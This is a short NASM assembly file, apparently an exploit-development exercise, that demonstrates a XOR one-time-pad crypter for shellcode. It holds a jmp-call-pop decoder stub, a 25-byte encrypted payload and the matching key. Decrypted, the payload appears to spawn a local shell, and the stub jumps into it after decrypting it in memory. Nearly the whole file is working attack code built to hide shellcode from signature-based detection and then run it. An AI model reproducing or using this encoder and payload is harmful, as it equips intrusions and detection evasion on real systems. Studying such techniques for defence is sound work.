; Filename: xor-otp.nasm
; Author: lastlistener
; Purpose: Demonstrate the use of a XOR one-time pad for encrypting and decrypting shellcode.

global _start			

section .text
_start:

	jmp short call_decrypter

decrypter:
	pop esi
	xor ecx, ecx
	mov cl, 25


decrypt:
	mov al,byte [esi + 25]		; grab the byte of key associated with this byte of shellcode
	xor byte [esi], al
	inc esi
	loop decrypt

	jmp short Shellcode

call_decrypter:
	call decrypter
	Shellcode: db 0x95,0x41,0x13,0x56,0xca,0xba,0x28,0x01,0x2b,0x84,0x34,0x6a,0x82,0xd5,0x35,0x70,0x2c,0x65,0xd6,0xca,0x59,0xd0,0x60,0x89,0xb1
	Key: db 0xa4,0x81,0x43,0x3e,0xe5,0x95,0x5b,0x69,0x43,0xab,0x56,0x03,0xec,0x5c,0xd6,0x20,0xa5,0x87,0x85,0x43,0xb8,0x60,0x6b,0x44,0x31

